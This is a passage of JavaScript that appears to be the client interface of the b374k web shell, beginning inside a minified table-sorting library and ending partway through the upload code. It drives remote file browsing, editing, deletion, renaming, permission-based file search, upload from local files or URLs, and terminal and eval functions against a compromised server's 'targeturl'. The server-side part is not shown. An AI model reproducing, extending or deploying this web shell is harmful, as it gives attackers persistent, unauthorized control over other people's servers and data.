if(1==a.tHead.rows.length){sortbottomrows=[];for(var b=0;b<a.rows.length;b++)-1!=a.rows[b].className.search(/\bsortbottom\b/)&&(sortbottomrows[sortbottomrows.length]=a.rows[b]);if(sortbottomrows){null==a.tFoot&&(tfo=document.createElement("tfoot"),a.appendChild(tfo));for(b=0;b<sortbottomrows.length;b++)tfo.appendChild(sortbottomrows[b]);delete sortbottomrows}headrow=a.tHead.rows[0].cells;for(b=0;b<headrow.length;b++)if(!headrow[b].className.match(/\bsorttable_nosort\b/)){(mtch=headrow[b].className.match(/\bsorttable_([a-z0-9]+)\b/))&&
	(override=mtch[1]);headrow[b].p=mtch&&"function"==typeof sorttable["sort_"+override]?sorttable["sort_"+override]:sorttable.j(a,b);headrow[b].o=b;headrow[b].c=a.tBodies[0];var c=headrow[b],e=sorttable.q=function(){if(-1!=this.className.search(/\bsorttable_sorted\b/))sorttable.reverse(this.c),this.className=this.className.replace("sorttable_sorted","sorttable_sorted_reverse"),this.removeChild(document.getElementById("sorttable_sortfwdind")),sortrevind=document.createElement("span"),sortrevind.id="sorttable_sortrevind",
	sortrevind.innerHTML="&nbsp;&#x25B4;",this.appendChild(sortrevind);else if(-1!=this.className.search(/\bsorttable_sorted_reverse\b/))sorttable.reverse(this.c),this.className=this.className.replace("sorttable_sorted_reverse","sorttable_sorted"),this.removeChild(document.getElementById("sorttable_sortrevind")),sortfwdind=document.createElement("span"),sortfwdind.id="sorttable_sortfwdind",sortfwdind.innerHTML="&nbsp;&#x25BE;",this.appendChild(sortfwdind);else{theadrow=this.parentNode;l(theadrow.childNodes,
		function(a){1==a.nodeType&&(a.className=a.className.replace("sorttable_sorted_reverse",""),a.className=a.className.replace("sorttable_sorted",""))});(sortfwdind=document.getElementById("sorttable_sortfwdind"))&&sortfwdind.parentNode.removeChild(sortfwdind);(sortrevind=document.getElementById("sorttable_sortrevind"))&&sortrevind.parentNode.removeChild(sortrevind);this.className+=" sorttable_sorted";sortfwdind=document.createElement("span");sortfwdind.id="sorttable_sortfwdind";sortfwdind.innerHTML=
	"&nbsp;&#x25BE;";this.appendChild(sortfwdind);row_array=[];col=this.o;rows=this.c.rows;for(var a=0;a<rows.length;a++)row_array[row_array.length]=[sorttable.d(rows[a].cells[col]),rows[a]];row_array.sort(this.p);tb=this.c;for(a=0;a<row_array.length;a++)tb.appendChild(row_array[a][1]);delete row_array}};if(c.addEventListener)c.addEventListener("click",e,j);else{e.f||(e.f=n++);c.b||(c.b={});var g=c.b.click;g||(g=c.b.click={},c.onclick&&(g[0]=c.onclick));g[e.f]=e;c.onclick=p}}}},j:function(a,b){sortfn=
		sorttable.l;for(var c=0;c<a.tBodies[0].rows.length;c++)if(text=sorttable.d(a.tBodies[0].rows[c].cells[b]),""!=text){if(text.match(/^-?[\u00a3$\u00a4]?[\d,.]+%?$/))return sorttable.n;if(possdate=text.match(sorttable.a)){first=parseInt(possdate[1]);second=parseInt(possdate[2]);if(12<first)return sorttable.g;if(12<second)return sorttable.m;sortfn=sorttable.g}}return sortfn},d:function(a){if(!a)return"";hasInputs="function"==typeof a.getElementsByTagName&&a.getElementsByTagName("input").length;if(""!=
			a.title)return a.title;if("undefined"!=typeof a.textContent&&!hasInputs)return a.textContent.replace(/^\s+|\s+$/g,"");if("undefined"!=typeof a.innerText&&!hasInputs)return a.innerText.replace(/^\s+|\s+$/g,"");if("undefined"!=typeof a.text&&!hasInputs)return a.text.replace(/^\s+|\s+$/g,"");switch(a.nodeType){case 3:if("input"==a.nodeName.toLowerCase())return a.value.replace(/^\s+|\s+$/g,"");case 4:return a.nodeValue.replace(/^\s+|\s+$/g,"");case 1:case 11:for(var b="",c=0;c<a.childNodes.length;c++)b+=
		sorttable.d(a.childNodes[c]);return b.replace(/^\s+|\s+$/g,"");default:return""}},reverse:function(a){newrows=[];for(var b=0;b<a.rows.length;b++)newrows[newrows.length]=a.rows[b];for(b=newrows.length-1;0<=b;b--)a.appendChild(newrows[b]);delete newrows},n:function(a,b){aa=parseFloat(a[0].replace(/[^0-9.-]/g,""));isNaN(aa)&&(aa=0);bb=parseFloat(b[0].replace(/[^0-9.-]/g,""));isNaN(bb)&&(bb=0);return aa-bb},l:function(a,b){return a[0].toLowerCase()==b[0].toLowerCase()?0:a[0].toLowerCase()<b[0].toLowerCase()?
			-1:1},g:function(a,b){mtch=a[0].match(sorttable.a);y=mtch[3];m=mtch[2];d=mtch[1];1==m.length&&(m="0"+m);1==d.length&&(d="0"+d);dt1=y+m+d;mtch=b[0].match(sorttable.a);y=mtch[3];m=mtch[2];d=mtch[1];1==m.length&&(m="0"+m);1==d.length&&(d="0"+d);dt2=y+m+d;return dt1==dt2?0:dt1<dt2?-1:1},m:function(a,b){mtch=a[0].match(sorttable.a);y=mtch[3];d=mtch[2];m=mtch[1];1==m.length&&(m="0"+m);1==d.length&&(d="0"+d);dt1=y+m+d;mtch=b[0].match(sorttable.a);y=mtch[3];d=mtch[2];m=mtch[1];1==m.length&&(m="0"+m);1==d.length&&
			(d="0"+d);dt2=y+m+d;return dt1==dt2?0:dt1<dt2?-1:1},r:function(a,b){for(var c=0,e=a.length-1,g=h;g;){for(var g=j,f=c;f<e;++f)0<b(a[f],a[f+1])&&(g=a[f],a[f]=a[f+1],a[f+1]=g,g=h);e--;if(!g)break;for(f=e;f>c;--f)0>b(a[f],a[f-1])&&(g=a[f],a[f]=a[f-1],a[f-1]=g,g=h);c++}}};document.addEventListener&&document.addEventListener("DOMContentLoaded",sorttable.e,j);if(/WebKit/i.test(navigator.userAgent))var k=setInterval(function(){/loaded|complete/.test(document.readyState)&&sorttable.e()},10);
			window.onload=sorttable.e;var n=1;function p(a){var b=h;a||(a=((this.ownerDocument||this.document||this).parentWindow||window).event,a.preventDefault=q,a.stopPropagation=r);var c=this.b[a.type],e;for(e in c)this.h=c[e],this.h(a)===j&&(b=j);return b}function q(){this.returnValue=j}function r(){this.cancelBubble=h}Array.forEach||(Array.forEach=function(a,b,c){for(var e=0;e<a.length;e++)b.call(c,a[e],e,a)});
			Function.prototype.forEach=function(a,b,c){for(var e in a)"undefined"==typeof this.prototype[e]&&b.call(c,a[e],e,a)};String.forEach=function(a,b,c){Array.forEach(a.split(""),function(e,g){b.call(c,e,g,a)})};function l(a,b){if(a){var c=Object;if(a instanceof Function)c=Function;else{if(a.forEach instanceof Function){a.forEach(b,void 0);return}"string"==typeof a?c=String:"number"==typeof a.length&&(c=Array)}c.forEach(a,b,void 0)}};

			var loading_count = 0;
			var running = false;
			var defaultTab = 'explorer';
			var currentTab = $('#'+defaultTab);
			var tabScroll = new Object;
			var onDrag = false;
			var onScroll = false;
			var scrollDelta = 1;
			var scrollCounter = 0;
			var scrollSpeed = 60;
			var scrollTimer = '';
			var dragX = '';
			var dragY = '';
			var dragDeltaX = '';
			var dragDeltaY = '';
			var editSuccess = '';
			var terminalHistory = new Array();
			var terminalHistoryPos = 0;
			var evalSupported = "";
			var evalReady = false;
			var resizeTimer = '';
			var portableWidth = 700;
			var portableMode = null;

			Zepto(function($){
				if(init_shell){
					var now = new Date();
					output("started @ "+ now.toGMTString());
					output("cwd : "+get_cwd());
					output("module : "+module_to_load);

					show_tab();
					xpl_bind();
					eval_init();
					
					window_resize();
					
					xpl_update_status();
					
					$(window).on('resize', function(e){
						clearTimeout(resizeTimer);
						resizeTimer = setTimeout("window_resize()", 1000);
					});

					$('.menuitem').on('click', function(e){
						selectedTab = $(this).attr('href').substr(2);
						show_tab(selectedTab);
					});

					$('#logout').on('click', function(e){
						var cookie = document.cookie.split(';');
						for(var i=0; i<cookie.length; i++){
							var entries = cookie[i], entry = entries.split("="), name = entry[0];
							document.cookie = name + "=''; expires=Thu, 01 Jan 1970 00:00:01 GMT; path=/";
						}
						localStorage.clear();
						location.href = targeturl;
					});

					$('#totop').on('click', function(e){
						$(window).scrollTop(0);
					});
					$('#totop').on('mouseover', function(e){
						onScroll = true;
						clearTimeout(scrollTimer);
						start_scroll('top');
					});
					$('#totop').on('mouseout', function(e){
						onScroll = false;
						scrollCounter = 0;
					});
					$('#tobottom').on('click', function(e){
						$(window).scrollTop($(document).height()-$(window).height());
					});
					$('#tobottom').on('mouseover', function(e){
						onScroll = true;
						clearTimeout(scrollTimer);
						start_scroll('bottom');
					});
					$('#tobottom').on('mouseout', function(e){
						onScroll = false;
						scrollCounter = 0;
					});
					$('#basicInfo').on('mouseenter', function(e){
						$('#toggleBasicInfo').show();
					});
					$('#basicInfo').on('mouseleave', function(e){
						$('#toggleBasicInfo').hide();
					});
					$('#toggleBasicInfo').on('click', function(e){
						$('#basicInfo').hide();
						$('#showinfo').show();
						$('#toggleBasicInfo').hide();
						localStorage.setItem('infoBarShown', 'hidden');
					});
					$('#showinfo').on('click', function(e){
						$('#basicInfo').show();
						$('#showinfo').hide();
						localStorage.setItem('infoBarShown', 'shown');
					});
					
					if((infoBarShown = localStorage.getItem('infoBarShown'))){
						if(infoBarShown=='shown'){
							$('#basicInfo').show();
							$('#showinfo').hide();
						}
						else{
							$('#basicInfo').hide();
							$('#showinfo').show();
							$('#toggleBasicInfo').hide();
						}
					}
					else{
						info_refresh();
					}

					if(history.pushState){
						window.onpopstate = function(event) { refresh_tab(); };
					}
					else{
						window.historyEvent = function(event) {	refresh_tab(); };
					}
				}
			});

			function output(str){
				console.log('b374k> '+str);
			}

			function window_resize(){
				bodyWidth = $('body').width();
				if(bodyWidth<=portableWidth){
					layout_portable();
				}
				else{
					layout_normal();
				}
			}

			function layout_portable(){
				nav = $('#nav');
				menu = $('#menu');
				headerNav = $('#headerNav');
				content = $('#content');

	//nav.hide();
	nav.prependTo('#content');
	nav.css('padding','5px 8px');
	nav.css('margin-top', '8px');
	nav.css('display','block');
	nav.addClass('border');
	
	menu.children().css('width', '100%');
	menu.hide();
	$('#menuButton').remove();	
	headerNav.prepend("<div id='menuButton' class='boxtitle' onclick=\"$('#menu').toggle();\" style='float-left;display:inline;padding:4px 8px;margin-right:8px;'>menu</div>");
	menu.attr('onclick', "\$('#menu').hide();");
	
	$('#xplTable tr>:nth-child(4)').hide();
	$('#xplTable tr>:nth-child(5)').hide();
	if(!win){
		$('#xplTable tr>:nth-child(6)').hide();
	}
	
	tblfoot = $('#xplTable tfoot td:last-child');
	if(tblfoot[0]) tblfoot[0].colSpan = 1;
	if(tblfoot[1]) tblfoot[1].colSpan = 2;
	
	
	$('.box').css('width', '100%');
	$('.box').css('height', '100%');
	$('.box').css('left', '0px');
	$('.box').css('top', '0px');
	
	paddingTop = $('#header').height();
	content.css('padding-top', paddingTop+'px');
	
	portableMode = true;
}

function layout_normal(){	
	nav = $('#nav');
	menu = $('#menu');	
	content = $('#content');

	nav.insertAfter('#b374k');
	nav.css('padding','0');
	nav.css('margin-top', '0');
	nav.css('display','inline');
	nav.removeClass('border');
	
	menu.children().css('width', 'auto');
	menu.show();
	$('#menuButton').remove();
	menu.attr('onclick', "");
	
	$('#xplTable tr>:nth-child(4)').show();
	$('#xplTable tr>:nth-child(5)').show();
	if(!win){
		$('#xplTable tr>:nth-child(6)').show();
		colspan = 4;
	}
	else colspan = 3;
	
	tblfoot = $('#xplTable tfoot td:last-child');
	if(tblfoot[0]) tblfoot[0].colSpan = colspan;
	if(tblfoot[1]) tblfoot[1].colSpan = colspan+1;

	paddingTop = $('#header').height();
	content.css('padding-top', paddingTop+'px');
	
	portableMode = false;
}

function start_scroll(str){
	if(str=='top'){
		to = $(window).scrollTop() - scrollCounter;
		scrollCounter = scrollDelta + scrollCounter;
		if(to<=0){
			to = 0;
			onScroll = false;
		}
		else if(onScroll){
			scrollTimer = setTimeout("start_scroll('top')", scrollSpeed);
			$(window).scrollTop(to);
		}
	}
	else if(str=='bottom'){
		to = $(window).scrollTop() + scrollCounter;
		scrollCounter = scrollDelta + scrollCounter;
		bottom = $(document).height()-$(window).height();
		if(to>=bottom){
			to = bottom;
			onScroll = false;
		}
		else if(onScroll){
			scrollTimer = setTimeout("start_scroll('bottom')", scrollSpeed);
			$(window).scrollTop(to);
		}
	}
}

function get_cwd(){
	return decodeURIComponent(get_cookie('cwd'));
}

function fix_tabchar(el, e){
	if(e.keyCode==9){
		e.preventDefault();
		var s = el.selectionStart;
		el.value = el.value.substring(0,el.selectionStart) + "\t" + el.value.substring(el.selectionEnd);
		el.selectionEnd = s+1;
	}
}

function get_cookie(key){
	var res;
	return (res = new RegExp('(?:^|; )' + encodeURIComponent(key) + '=([^;]*)').exec(document.cookie)) ? (res[1]) : null;
}

function set_cookie(key, value){
	document.cookie = key + '=' + encodeURIComponent(value);
}

function html_safe(str){
	if(typeof(str) == "string"){
		str = str.replace(/&/g, "&amp;");
		str = str.replace(/"/g, "&quot;");
		str = str.replace(/'/g, "&#039;");
		str = str.replace(/</g, "&lt;");
		str = str.replace(/>/g, "&gt;");
	}
	return str;
}

function ucfirst(str){
	return str.charAt(0).toUpperCase() + str.slice(1);
}

function time(){
	var d = new Date();
	return d.getTime();
}

function send_post(targetdata, callback, loading){
	if(loading==null) loading_start();
	$.ajax({
		url: targeturl,
		type: 'POST',
		data: targetdata,
		success: function(res){
			callback(res);
			if(loading==null) loading_stop();
		},
		error: function(){ if(loading==null) loading_stop(); }
	});
}

function loading_start(){
	if(!running){
		$('#overlay').show();
		running = true;
		loading_loop();
	}
}

function loading_loop(){
	if(running){
		img = $('#loading');
		img.css('transform', 'rotate('+loading_count+'deg)');
		img.css('-ms-transform', 'rotate('+loading_count+'deg)');
		img.css('-webkit-transform', 'rotate('+loading_count+'deg)');

		loading_count+=7;
		if(loading_count>360) loading_count = 0;
		if(running) setTimeout("loading_loop()",20);
	}
}

function loading_stop(){
	if(running){
		img = $('#loading');
		img.css('transform', 'rotate(0deg)');
		img.css('-ms-transform', 'rotate(0deg)');
		img.css('-webkit-transform', 'rotate(0deg)');

		$('#overlay').hide();
		running = false;
	}
}

function show_tab(id){
	if(!id){
		if(location.hash!='') id = location.hash.substr(2);
		else id = defaultTab;
	}
	refresh_tab(id);
}

function refresh_tab(id){
	if(!id){
		if(location.hash!='') id = location.hash.substr(2);
		else id = defaultTab;
	}
	$('.menuitemSelected').removeClass("menuitemSelected");
	$('#menu'+id).addClass("menuitemSelected");

	tabScroll[currentTab.attr('id')] = $(window).scrollTop();
	currentTab.hide();
	currentTab = $('#'+id);
	currentTab.show();
	window[id]();
	if(tabScroll[id]){
		$(window).scrollTop(tabScroll[id]);
	}
	hide_box();
}

function trap_enter(e, callback){
	if(e.keyCode==13){
		if(callback!=null) window[callback]();
	}
}

function show_box(title, content){
	onDrag = false;
	hide_box();
	box = "<div class='box'><p class='boxtitle'>"+title+"<span class='boxclose floatRight'>x</span></p><div class='boxcontent'>"+content+"</div><div class='boxresult'></div></div>";
	$('#content').append(box);

	box_width = $('.box').width();
	body_width = $('body').width();

	box_height = $('.box').height();
	body_height = $('body').height();

	x = (body_width - box_width)/2;
	y = (body_height - box_height)/2;
	if(x<0 || portableMode) x = 0;
	if(y<0 || portableMode) y = 0;
	if(portableMode){
		$('.box').css('width', '100%');
		$('.box').css('height', '100%');	
	}

	$('.box').css('left', x+'px');
	$('.box').css('top', y+'px');

	$('.boxclose').on('click', function(e){
		hide_box();
	});
	
	if(!portableMode){
		$('.boxtitle').on('click', function(e){
			if(!onDrag){
				dragDeltaX = e.pageX - parseInt($('.box').css('left'));
				dragDeltaY = e.pageY - parseInt($('.box').css('top'));
				drag_start();
			}
			else drag_stop();
		});
	}

	$(document).off('keyup');
	$(document).on('keyup', function(e){
		if(e.keyCode == 27) hide_box();
	});

	if($('.box input')[0]) $('.box input')[0].focus();
}

function hide_box(){
	$(document).off('keyup');
	$('.box').remove();
}

function drag_start(){
	if(!onDrag){
		onDrag = true;
		$('body').off('mousemove');
		$('body').on('mousemove', function(e){
			dragX = e.pageX;
			dragY = e.pageY;
		});
		setTimeout('drag_loop()',50);
	}
}

function drag_loop(){
	if(onDrag){
		x = dragX - dragDeltaX;
		y = dragY - dragDeltaY;
		if(y<0)y=0;
		$('.box').css('left', x+'px');
		$('.box').css('top', y+'px');
		setTimeout('drag_loop()',50);
	}
}

function drag_stop(){
	onDrag = false;
	$('body').off('mousemove');
}

function get_all_cbox_selected(id, callback){
	var buffer = new Array();
	$('#'+id).find('.cBoxSelected').not('.cBoxAll').each(function(i){
		if((href = window[callback]($(this)))){
			buffer[i] = href;
		}
	});
	return buffer;
}


function cbox_bind(id, callback){
	$('#'+id).find('.cBox').off('click');
	$('#'+id).find('.cBoxAll').off('click');

	$('#'+id).find('.cBox').on('click', function(e){
		if($(this).hasClass('cBoxSelected')){
			$(this).removeClass('cBoxSelected');
		}
		else $(this).addClass('cBoxSelected');
		if(callback!=null) window[callback]();
	});
	$('#'+id).find('.cBoxAll').on('click', function(e){
		if($(this).hasClass('cBoxSelected')){
			$('#'+id).find('.cBox').removeClass('cBoxSelected');
			$('#'+id).find('.cBoxAll').removeClass('cBoxSelected');
		}
		else{
			$('#'+id).find('.cBox').not('.cBoxException').addClass('cBoxSelected');
			$('#'+id).find('.cBoxAll').not('.cBoxException').addClass('cBoxSelected');
		}
		if(callback!=null) window[callback]();
	});
}


function action(path, type){
	title = "Action";
	content = '';
	if(type=='file') content = "<table class='boxtbl'><tr><td><input type='text' value='"+path+"' disabled></td></tr><tr data-path='"+path+"'><td><span class='edit button'>edit</span><span class='ren button'>rename</span><span class='del button'>delete</span><span class='dl button'>download</span></td></tr></table>";
	if(type=='dir') content = "<table class='boxtbl'><tr><td><input type='text' value='"+path+"' disabled></td></tr><tr data-path='"+path+"'><td><span class='find button'>find</span><span class='ul button'>upload</span><span class='ren button'>rename</span><span class='del button'>delete</span></td></tr></table>";
	if(type=='dot') content = "<table class='boxtbl'><tr><td><input type='text' value='"+path+"' disabled></td></tr><tr data-path='"+path+"'><td><span class='find button'>find</span><span class='ul button'>upload</span><span class='ren button'>rename</span><span class='del button'>delete</span><span class='newfile button'>new file</span><span class='newfolder button'>new folder</span></td></tr></table>";
	show_box(title, content);
	xpl_bind();
}

function navigate(path, showfiles){
	if(showfiles==null) showfiles = 'true';
	send_post({ cd:path, showfiles:showfiles }, function(res){
		if(res!='error'){
			splits = res.split('{[|b374k|]}');
			if(splits.length==3){
				$('#nav').html(splits[1]);
				if(showfiles=='true'){
					$('#explorer').html('');
					$('#explorer').html(splits[2]);
					sorttable.k($('#xplTable').get(0));
				}
				$('#terminalCwd').html(html_safe(get_cwd())+'&gt;');
				xpl_bind();
				window_resize();
			}
		}
	});
}

function view(path, type, preserveTimestamp){
	if(preserveTimestamp==null) preserveTimestamp = 'true';
	send_post({ viewFile: path, viewType: type, preserveTimestamp:preserveTimestamp }, function(res){
		if(res!='error'){
			$('#explorer').html('');
			$('#explorer').html(res);
			xpl_bind();
			show_tab('explorer');
			if((type=='edit')||(type=='hex')){
				editResult = (type=='edit')? $('#editResult'):$('#editHexResult');
				if(editSuccess=='success'){
					editResult.html(' ( File saved )');
				}
				else if(editSuccess=='error'){
					editResult.html(' ( Failed to save file )');
				}
				editSuccess = '';
			}
			cbox_bind('editTbl');
		}
	});
}

function view_entry(el){
	if($(el).attr('data-path')!=''){
		entry = $(el).attr('data-path');
		$('#form').append("<input type='hidden' name='viewEntry' value='"+entry+"'>");
		$('#form').submit();
		$('#form').html('');
	}
}

function ren(path){
	title = "Rename";
	content = "<table class='boxtbl'><tr><td class='colFit'>Rename to</td><td><input type='text' class='renameFileTo' value='" +path+"' onkeydown=\"trap_enter(event, 'ren_go');\"><input type='hidden' class='renameFile' value='"+path+"'></td></tr><tr><td colspan='2'><span class='button' onclick='ren_go();'>rename</span></td></tr></table>";
	show_box(title, content);
}

function ren_go(){
	renameFile = $('.renameFile').val();
	renameFileTo = $('.renameFileTo').val();
	send_post({renameFile:renameFile, renameFileTo:renameFileTo}, function(res){
		if(res!='error'){
			navigate(res);
			$('.boxresult').html('Operation(s) succeeded');
			$('.renameFile').val($('.renameFileTo').val());
		}
		else $('.boxresult').html('Operation(s) failed');
	});
}

function newfolder(path){
	title = "New Folder";
	path = path + 'newfolder-' + time();
	content = "<table class='boxtbl'><tr><td class='colFit'>Folder Name</td><td><input type='text' class='newFolder' value='"+path+"' onkeydown=\"trap_enter(event, 'newfolder_go');\"></td></tr><tr><td colspan='2'><span class='button' onclick='newfolder_go();'>create</span></td></tr></table>";
	show_box(title, content);
}

function newfolder_go(){
	newFolder = $('.newFolder').val();
	send_post({newFolder:newFolder}, function(res){
		if(res!='error'){
			navigate(res);
			$('.boxresult').html('Operation(s) succeeded');
		}
		else $('.boxresult').html('Operation(s) failed');
	});
}

function newfile(path){
	title = "New File";
	path = path + 'newfile-' + time();
	content = "<table class='boxtbl'><tr><td class='colFit'>File Name</td><td><input type='text' class='newFile' value='"+path+"' onkeydown=\"trap_enter(event, 'newfile_go');\"></td></tr><tr><td colspan='2'><span class='button' onclick='newfile_go();'>create</span></td></tr></table>";
	show_box(title, content);
}

function newfile_go(){
	newFile = $('.newFile').val();
	send_post({newFile:newFile}, function(res){
		if(res!='error'){
			view(newFile, 'edit');
			$('.boxresult').html('Operation(s) succeeded');
		}
		else $('.boxresult').html('Operation(s) failed');
	});
}

function viewfileorfolder(){
	title = "View File / Folder";
	content = "<table class='boxtbl'><tr><td><input type='text' class='viewFileorFolder' value='"+html_safe(get_cwd())+"' onkeydown=\"trap_enter(event, 'viewfileorfolder_go');\"></td></tr><tr><td><span class='button' onclick='viewfileorfolder_go();'>view</span></td></tr></table>";
	show_box(title, content);
}

function viewfileorfolder_go(){
	entry = $('.viewFileorFolder').val();
	send_post({viewFileorFolder:entry}, function(res){
		if(res!='error'){
			if(res=='file'){
				view(entry, 'auto');
				show_tab('explorer');
			}
			else if(res=='folder'){
				navigate(entry);
				show_tab('explorer');
			}
		}
	});
}

function del(path){
	title = "Delete";
	content = "<table class='boxtbl'><tr><td class='colFit'>Delete</td><td><input type='text' class='delete' value='"+path+"' onkeydown=\"trap_enter(event, 'delete_go');\"></td></tr><tr><td colspan='2'><span class='button' onclick='delete_go();'>delete</span></td></tr></table>";
	show_box(title, content);
}

function delete_go(){
	path = $('.delete').val();
	send_post({delete:path}, function(res){
		if(res!='error'){
			navigate(res);
			$('.boxresult').html('Operation(s) succeeded');
		}
		else $('.boxresult').html('Operation(s) failed');
	});
}

function find(path){
	findfile = "<table class='boxtbl'><thead><tr><th colspan='2'><p class='boxtitle'>Find File</p></th></tr></thead><tbody><tr><td style='width:144px'>Search in</td><td><input type='text' class='findfilePath' value='"+path+"' onkeydown=\"trap_enter(event, 'find_go_file');\"></td></tr><tr><td style='border-bottom:none;'>Filename contains</td><td style='border-bottom:none;'><input type='text' class='findfileFilename' onkeydown=\"trap_enter(event, 'find_go_file');\"></td></tr><tr><td></td><td><span class='cBox findfileFilenameRegex'></span><span class='floatLeft'>Regex</span>&nbsp;&nbsp;<span class='cBox findfileFilenameInsensitive'></span><span class='floatLeft'>Case Insensitive</span></td></tr><tr><td style='border-bottom:none;'>File contains</td><td style='border-bottom:none;'><input type='text' class='findfileContains' onkeydown=\"trap_enter(event, 'find_go_file');\"></td></tr><tr><td></td><td><span class='cBox findfileContainsRegex'></span><span class='floatLeft'>Regex</span>&nbsp;&nbsp;<span class='cBox findfileContainsInsensitive'></span><span class='floatLeft'>Case Insensitive</span></td></tr><tr><td>Permissions</td><td><span class='cBox findfileReadable'></span><span class='floatLeft'>Readable</span>&nbsp;&nbsp;<span class='cBox findfileWritable'></span><span class='floatLeft'>Writable</span>&nbsp;&nbsp;<span class='cBox findfileExecutable'></span><span class='floatLeft'>Executable</span></td></tr></tbody><tfoot><tr><td><span class='button navbar' data-path='"+path+"'>explorer</span></td><td><span class='button' onclick=\"find_go_file();\">find</span></td></tr><tr><td colspan='2' class='findfileResult'></td></tr></tfoot></table>";
	findfolder = "<table class='boxtbl'><thead><tr><th colspan='2'><p class='boxtitle'>Find Folder</p></th></tr></thead><tbody><tr><td style='width:144px'>Search in</td><td><input type='text' class='findFolderPath' value='"+path+"' onkeydown=\"trap_enter(event, 'find_go_folder');\"></td></tr><tr><td style='border-bottom:none;'>Foldername contains</td><td style='border-bottom:none;'><input type='text' class='findFoldername' onkeydown=\"trap_enter(event, 'find_go_folder');\"></td></tr><tr><td></td><td><span class='cBox findFoldernameRegex'></span><span class='floatLeft'>Regex</span>&nbsp;&nbsp;&nbsp;<span class='cBox findFoldernameInsensitive'></span><span class='floatLeft'>Case Insensitive</span></td></tr><tr><td>Permissions</td><td><span class='cBox findReadable'></span><span class='floatLeft'>Readable</span>&nbsp;&nbsp;<span class='cBox findWritable'></span><span class='floatLeft'>Writable</span>&nbsp;&nbsp;<span class='cBox findExecutable'></span><span class='floatLeft'>Executable</span></td></tr></tbody><tfoot><tr><td><span class='button navbar' data-path='"+path+"'>explorer</span></td><td><span class='button' onclick=\"find_go_folder();\">find</span></td></tr><tr><td colspan='2' class='findResult'></td></tr></tfoot></table>";
	$('#explorer').html("<div id='xplUpload'>" +findfile+'<br>'+findfolder+'</div>');
	cbox_bind('xplUpload');
}

function find_go_file(){
	find_go('file');
}

function find_go_folder(){
	find_go('folder');
}

function find_go(findType){
	findPath = (findType=='file')? $('.findfilePath').val():$('.findFolderPath').val();
	findResult = (findType=='file')? $('.findfileResult'):$('.findResult');

	findName = (findType=='file')? $('.findfileFilename').val():$('.findFoldername').val();
	findNameRegex = (findType=='file')? $('.findfileFilenameRegex').hasClass('cBoxSelected').toString():$('.findFoldernameRegex').hasClass('cBoxSelected').toString();
	findNameInsensitive = (findType=='file')? $('.findfileFilenameInsensitive').hasClass('cBoxSelected').toString():$('.findFoldernameInsensitive').hasClass('cBoxSelected').toString();

	findContent = (findType=='file')? $('.findfileContains').val():"";
	findContentRegex = (findType=='file')? $('.findfileContainsRegex').hasClass('cBoxSelected').toString():"";
	findContentInsensitive = (findType=='file')? $('.findfileContainsInsensitive').hasClass('cBoxSelected').toString():"";

	findReadable = (findType=='file')? $('.findfileReadable').hasClass('cBoxSelected').toString():$('.findWritable').hasClass('cBoxSelected').toString();
	findWritable = (findType=='file')? $('.findfileWritable').hasClass('cBoxSelected').toString():$('.findReadable').hasClass('cBoxSelected').toString();
	findExecutable = (findType=='file')? $('.findfileExecutable').hasClass('cBoxSelected').toString():$('.findExecutable').hasClass('cBoxSelected').toString();

	send_post(
	{
		findType:findType,
		findPath:findPath,
		findName:findName,
		findNameRegex:findNameRegex,
		findNameInsensitive:findNameInsensitive,
		findContent:findContent,
		findContentRegex:findContentRegex,
		findContentInsensitive:findContentInsensitive,
		findReadable:findReadable,
		findWritable:findWritable,
		findExecutable:findExecutable
	},
	function(res){
		if(res!='error'){
			findResult.html(res);
		}
	}
	);
}

function ul_go_comp(){
	ul_go('comp');
}

function ul_go_url(){
	ul_go('url');
}

function ul(path){
	ulcomputer = "<table class='boxtbl ulcomp'><thead><tr><th colspan='2'><p class='boxtitle'>Upload From Computer <a onclick='ul_add_comp();'>(+)</a></p></th></tr></thead><tbody class='ulcompadd'></tbody><tfoot><tr><td><span class='button navbar' data-path='"+path+"'>explorer</span></td><td><span class='button' onclick=\"ul_go_comp();\">upload</span></td></tr><tr><td colspan='2' class='ulCompResult'></td></tr><tr><td colspan='2'><div id='ulDragNDrop'>Or Drag and Drop files here</div></td></tr><tr><td colspan='2' class='ulDragNDropResult'></td></tr></tfoot></table>";
	ulurl = "<table class='boxtbl ulurl'><thead><tr><th colspan='2'><p class='boxtitle'>Upload From Url <a onclick='ul_add_url();'>(+)</a></p></th></tr></thead><tbody class='ulurladd'></tbody><tfoot><tr><td><span class='button navbar' data-path='"+path+"'>explorer</span></td><td><span class='button' onclick=\"ul_go_url();\">upload</span></td></tr><tr><td colspan='2' class='ulUrlResult'></td></tr></tfoot></table>";
	content = ulcomputer + '<br>' + ulurl + "<input type='hidden' class='ul_path' value='"+path+"'>";
	$('#explorer').html(content);
	ul_add_comp();
	ul_add_url();

	$('#ulDragNDrop').on('dragenter', function(e){
		e.stopPropagation();
		e.preventDefault();
	});

	$('#ulDragNDrop').on('dragover', function(e){
		e.stopPropagation();
		e.preventDefault();
	});

	$('#ulDragNDrop').on('drop', function(e){
		e.stopPropagation();
		e.preventDefault();

		files = e.target.files || e.dataTransfer.files;
		ulResult = $('.ulDragNDropResult');
		ulResult.html('');
		$.each(files, function(i){
			if(this){
				ulType = 'DragNDrop';
				filename = this.name;

				var formData = new FormData();
				formData.append('ulFile', this);
				formData.append('ulSaveTo', get_cwd());
				formData.append('ulFilename', filename);
				formData.append('ulType', 'comp');

				entry = "<p class='ulRes"+ulType+i+"'><span class='strong'>&gt;</span>&nbsp;<a onclick='view_entry(this);' class='ulFilename"+ulType+i+"'>"+filename+"</a>&nbsp;<span class='ulProgress"+ulType+i+"'></span></p>";
				ulResult.append(entry);

				if(this.size<=0){
					$('.ulProgress'+ulType+i).html('( failed )');
					$('.ulProgress'+ulType+i).removeClass('ulProgress'+ulType+i);
					$('.ulFilename'+ulType+i).removeClass('ulFilename'+ulType+i);
				}
				else{
					ul_start(formData, ulType, i);
				}
			}
		});
	});
}

function ul_add_comp(path){
	path = html_safe($('.ul_path').val());
	$('.ulcompadd').append("<tr><td style='width:144px'>File</td><td><input type='file' class='ulFileComp'></td></tr><tr><td>Save to</td><td><input type='text' class='ulSaveToComp' value='"+path+"' onkeydown=\"trap_enter(event, 'ul_go_comp');\"></td></tr><tr><td>Filename (Optional)</td><td><input type='text' class='ulFilenameComp' onkeydown=\"trap_enter(event, 'ul_go_comp');\"></td></tr>");
}

function ul_add_url(path){
	path = html_safe($('.ul_path').val());
